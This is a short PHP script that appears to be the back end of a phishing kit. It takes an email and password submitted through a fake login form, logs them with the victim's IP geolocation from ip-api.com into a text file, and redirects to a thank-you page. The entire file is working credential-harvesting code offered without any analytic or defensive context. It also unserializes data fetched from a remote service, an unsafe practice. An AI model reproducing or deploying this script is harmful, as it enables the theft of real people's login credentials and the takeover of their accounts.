<?php
$ip = $_SERVER['REMOTE_ADDR']; // the IP address to query
		$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
		$message .= "+=+=+=+=+=+=+=+=+[ -   reg   - ]+=+=+=+=+=+=+=+=+\n";
		$message .= "Email:     ".$_POST['userNickName']."\n";
		$message .= "pass:     ".$_POST['userPassword']."\n";
		$message .= "+=+=+=+=+=+=+=+=+[ -    END     - ]+=+=+=+=+=+=+=+=+\n";
		$file = fopen("093.txt", 'a');
		fwrite($file, $message);
		header("Location:thankss.html");
?>